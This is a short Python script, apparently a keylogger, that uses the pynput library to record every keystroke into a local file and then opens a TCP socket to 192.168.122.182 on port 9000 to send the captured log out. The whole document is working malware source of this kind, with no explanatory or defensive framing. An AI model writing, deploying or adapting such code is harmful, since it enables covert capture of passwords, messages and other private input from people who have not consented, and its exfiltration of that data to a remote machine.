import os
from pynput import keyboard
import socket

def on_press(key):
    with open('keylogs.txt', 'a') as f:
        try:
            f.write(str(key) + '\n')
            print(f'Key {str(key)} pressed and logged')
        except AttributeError:
            pass

def transmit_file():
    server = ('192.168.122.182', 9000)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(server)
        with open('keylogs.txt', 'rb') as f:
            data = f.read()
            s.sendall(data)
    print('File transmitted to server')

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

transmit_file()